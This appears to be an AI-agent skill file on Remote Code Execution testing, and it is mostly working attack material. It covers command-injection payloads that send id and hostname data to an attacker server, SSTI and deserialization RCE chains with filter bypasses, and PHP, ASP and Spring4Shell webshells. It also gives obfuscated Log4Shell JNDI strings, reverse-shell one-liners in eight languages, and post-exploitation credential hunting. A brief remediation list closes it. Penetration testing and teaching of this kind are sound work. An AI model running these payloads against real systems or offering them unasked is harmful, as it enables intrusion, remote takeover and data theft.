---
name: rce
description: >
  Expert guidance for finding, exploiting, and remediating Remote Code Execution (RCE)
  vulnerabilities. Covers OS command injection, code injection (PHP/Python/Ruby/Node/Java),
  template injection (SSTI), deserialization RCE, file upload RCE, eval injection, XXE-to-RCE,
  SSRF-to-RCE, log4shell, and reverse shell payloads. Use this skill whenever the user mentions
  RCE, remote code execution, command injection, OS injection, SSTI, server-side template
  injection, deserialization, file upload shell, eval injection, Log4Shell, Spring4Shell,
  reverse shell, webshell, or code execution via any vulnerability. Also trigger for "how do I
  get RCE", "command injection payload", "SSTI to RCE", "PHP file upload shell", "Java
  deserialization exploit", "reverse shell one-liner". Always use this skill for any code or
  command execution security testing, even quick one-liner questions.
---

# RCE Skill — Remote Code Execution Testing

RCE is the most critical web vulnerability class — achieving arbitrary code execution on the
target server. Covers all major RCE vectors.

---

## 1. Attack Surface Map — Start Here

| Vector | Section |
|--------|---------|
| OS Command Injection | §3.1 |
| Code Injection (PHP/Python/Node/Ruby) | §3.2 |
| Server-Side Template Injection (SSTI) | §3.3 |
| Java Deserialization | §3.4 |
| PHP Object Deserialization | §3.5 |
| File Upload RCE (webshell) | §3.6 |
| XML/XXE → RCE | §3.7 |
| Log4Shell (CVE-2021-44228) | §3.8 |
| Spring4Shell (CVE-2022-22965) | §3.9 |
| ImageMagick (ImageTragick) | §3.10 |
| Reverse Shells (all languages) | §4 |

---

## 2. Core Concepts

- **Command injection** — User input is passed unsanitized to a shell command.
- **Code injection** — User input is `eval()`'d as code in the server language.
- **SSTI** — Template engine evaluates user-supplied template syntax as code.
- **Deserialization** — Untrusted serialized objects are deserialized, triggering gadget chains.
- **Webshell** — Uploaded script file that executes OS commands via HTTP parameter.

---

## 3. RCE Vectors

### 3.1 OS Command Injection

```bash
# Inject into any parameter that might be passed to OS commands
# Detection payloads (time-based = blind)
; sleep 10
| sleep 10
& sleep 10
`sleep 10`
$(sleep 10)
%0a sleep 10      # newline
%3b sleep 10      # semicolon URL-encoded

# Command separators
;   |   ||   &&   &   `cmd`   $(cmd)   %0a(newline)

# Classic output payloads
; id
; whoami
; cat /etc/passwd
; ls -la /
; env

# Blind — OOB exfiltration
; curl http://YOUR-SERVER/$(whoami)
; nslookup $(cat /etc/hostname).YOUR-OAST-DOMAIN
; wget http://YOUR-SERVER/?d=$(id|base64)

# Windows targets
& dir
& type C:\Windows\win.ini
& whoami
| ping -n 1 YOUR-SERVER
```

**Common injection points:**
- Ping/trace/nmap utilities, image/file converters, report generators
- `filename` parameters, `host` fields, `ip` parameters, search with shell features

```bash
# Fuzz with Burp / ffuf
# Try all separators × all commands
for sep in ';' '|' '&&' '`' '$()'; do
  echo "${sep}id" >> cmdi-payloads.txt
done
```

---

### 3.2 Code Injection

#### PHP

```php
// eval() injection
eval($_GET['code']);
?code=system('id');
?code=passthru('cat /etc/passwd');
?code=phpinfo();

// preg_replace /e modifier (PHP < 7)
?pattern=/test/e&replace=system('id')&subject=test

// include() with user input (LFI → RCE)
?page=php://input    [POST body: <?php system($_GET['c']); ?>]
?page=data://text/plain,<?php system('id');?>
?page=php://filter/convert.base64-decode/resource=...
```

#### Python

```python
# eval/exec injection
eval(user_input)
exec(user_input)

# Payloads
__import__('os').system('id')
__import__('subprocess').check_output('id',shell=True)

# Python pickle deserialization
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://YOUR-SERVER/$(id|base64)',))
```

#### Node.js

```javascript
// eval injection
eval(userInput)
// Payload: require('child_process').execSync('id').toString()

// vm escape
const vm = require('vm')
vm.runInNewContext(`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()`)

// Prototype pollution → RCE (in some frameworks)
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}
```

---

### 3.3 Server-Side Template Injection (SSTI)

#### Detection — inject math expressions

```
{{7*7}}       → 49?  (Jinja2, Twig, Freemarker)
${7*7}        → 49?  (Freemarker, Velocity)
<%= 7*7 %>    → 49?  (ERB / Ruby)
#{7*7}        → 49?  (Ruby string interpolation)
*{7*7}        → 49?  (Spring Thymeleaf)
```

#### Jinja2 (Python/Flask) — RCE

```python
# Basic RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Shorter variant
{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Bypass filters (no underscores / dots)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

#### Twig (PHP) — RCE

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

#### Freemarker (Java) — RCE

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

#### ERB (Ruby) — RCE

```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

#### Velocity (Java) — RCE

```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

**SSTI detection tool:**

```bash
# tplmap — automated SSTI detection and exploitation
python3 tplmap.py -u "https://target.com/page?name=INJECT"
```

---

### 3.4 Java Deserialization RCE

Vulnerable when: app deserializes user-supplied data (cookies, POST body, viewstate, AMF).

```bash
# ysoserial — generates deserialization gadget chain payloads
# https://github.com/frohoff/ysoserial

# Commons Collections gadget chain (most common)
java -jar ysoserial.jar CommonsCollections1 "curl http://YOUR-SERVER/$(whoami)" > payload.bin

# Other gadget chains: CommonsCollections2-7, Spring1, Groovy1, BeanShell1

# Send payload in cookie / POST body:
curl -X POST "https://target.com/app" \
     --data-binary @payload.bin \
     -H "Content-Type: application/x-java-serialized-object"

# Detect serialized Java: starts with 0xACED0005 or base64 "rO0AB"

# JNDI injection (Log4Shell style)
${jndi:ldap://YOUR-SERVER:1389/exploit}

# Gadget chain scanner
java -jar gadgetinspector.jar target.jar
```

---

### 3.5 PHP Object Deserialization

```php
// Vulnerable: unserialize($_GET['data'])

// PHP magic methods exploited: __wakeup, __destruct, __toString

// Example payload: write webshell via __destruct
class Shell {
    public $cmd = 'curl http://YOUR/shell.php -o /var/www/html/shell.php';
    function __destruct() { system($this->cmd); }
}
echo urlencode(serialize(new Shell()));

// Phar deserialization (file operations on attacker-controlled Phar)
// phar:///tmp/upload.jpg/exploit   (when file functions used on user input)
```

---

### 3.6 File Upload RCE (Webshell)

```php
// Simple PHP webshell
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
<?php passthru($_POST['cmd']); ?>

// Obfuscated
<?php $a=$_GET[0];$f=create_function('',"return $a;");$f(); ?>
```

```bash
# Extension bypass
shell.php → shell.php5 / .php7 / .phtml / .phar / .phps
shell.php → shell.php.jpg  (double extension)
shell.php → shell.PHP (case)
shell.php → shell.php%00.jpg (null byte, old servers)
shell.php → shell.php;.jpg
shell.jpg → change Content-Type to text/plain

# Magic bytes bypass (prepend JPEG magic bytes)
printf '\xFF\xD8\xFF\xE0' > shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg

# Upload then access
GET /uploads/shell.php?cmd=id
GET /uploads/shell.php5?cmd=whoami
```

```asp
<!-- ASP webshell -->
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process() {StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start() ? ... : ""); %>
```

---

### 3.7 Log4Shell (CVE-2021-44228)

```bash
# Inject JNDI lookup into any logged field
${jndi:ldap://YOUR-SERVER:1389/exploit}
${jndi:ldaps://YOUR-SERVER/exploit}
${jndi:rmi://YOUR-SERVER/exploit}

# Bypass filters
${${lower:j}ndi:${lower:l}dap://YOUR-SERVER/exploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://YOUR-SERVER/exploit}
${j${::-n}di:ldap://YOUR-SERVER/exploit}

# Inject in: User-Agent, X-Forwarded-For, Referer, username, email, any logged param
curl "https://target.com/login" \
     -H "User-Agent: \${jndi:ldap://YOUR-SERVER:1389/exploit}" \
     -d "username=\${jndi:ldap://YOUR-SERVER/exploit}&password=test"

# Exploit server
# Use marshalsec or JNDI-Exploit-Kit to serve malicious LDAP → class file
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.LDAPRefServer "http://YOUR-SERVER/#Exploit"
```

---

### 3.8 Spring4Shell (CVE-2022-22965)

```bash
# Requires: Java 9+, Tomcat, Spring MVC, ClassPathXmlApplicationContext
curl -X POST "https://target.com/endpoint" \
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22))&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
# Then access the dropped JSP webshell
```

---

## 4. Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat (with -e)
nc YOUR-IP 4444 -e /bin/bash

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("YOUR-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="YOUR-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("YOUR-IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR-IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Listener
nc -lvnp 4444
```

---

## 5. Post-Exploitation Basics

```bash
# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → enter

# Escalation recon
whoami; id; hostname; uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null   # SUID binaries
env | grep -i pass
find / -name "*.conf" -readable 2>/dev/null | head -20
```

---

## 6. Remediation

1. **Never pass user input to shell commands** — use language APIs instead.
2. **Parameterized queries** for DB; **subprocess arrays** for OS commands (no shell=True).
3. **Sandbox template engines** — disable dangerous features; use logic-less templates.
4. **Validate and sign serialized data** — never deserialize untrusted data.
5. **File upload** — allowlist extensions, store outside webroot, randomize filenames, scan content.
6. **Patch immediately** for known CVEs (Log4Shell, Spring4Shell).
7. **WAF rules** for `${jndi:`, `system(`, `eval(`, shell metacharacters.

---

## 7. RCE Testing Checklist

- [ ] Inject command separators into every parameter (`;id`, `|id`, `$(id)`)
- [ ] Test blind via timing: `; sleep 10`
- [ ] Test OOB: `; curl http://YOUR-SERVER/$(id|base64)`
- [ ] Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- [ ] Identify template engine from error messages
- [ ] Check for Java deserialization (magic bytes `rO0AB`)
- [ ] Test Log4Shell in all headers (User-Agent, X-Forwarded-For, Referer)
- [ ] Test file upload bypass (extension, MIME, magic bytes)
- [ ] Access uploaded file to confirm execution
- [ ] Check PHP `unserialize()` in cookies/POST params
- [ ] Set up listener before sending reverse shell payload
